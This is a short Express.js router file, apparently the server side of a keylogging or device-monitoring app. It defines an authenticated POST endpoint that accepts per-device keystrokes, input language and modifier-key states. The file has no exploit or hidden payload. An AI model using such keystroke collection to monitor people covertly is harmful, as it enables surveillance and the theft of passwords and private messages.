import express from "express";
import { addNewKeyLogs } from "../controllers/keylogs.controller";
import { check } from "express-validator";
import { authenticateJwt } from "../middleware/auth.middleware";

const router = express.Router();

// Add New Gallery
router.post(
	"/keylogs/add",
	[
		check("deviceId").optional(),
		check("keystrokes").optional(),
		check("actionType").optional(),
		check("inputLanguage").optional(),
		check("inputMethod").optional(),
		check("modifierKeys")
			.isObject()
			.notEmpty()
			.withMessage("Modifier keys are required"),
		check("modifierKeys.shift")
			.isBoolean()
			.withMessage("Shift must be a boolean value"),
		check("modifierKeys.ctrl")
			.isBoolean()
			.withMessage("Ctrl must be a boolean value"),
		check("modifierKeys.alt")
			.isBoolean()
			.withMessage("Alt must be a boolean value"),
	],
	authenticateJwt,
	addNewKeyLogs
);

export default router;
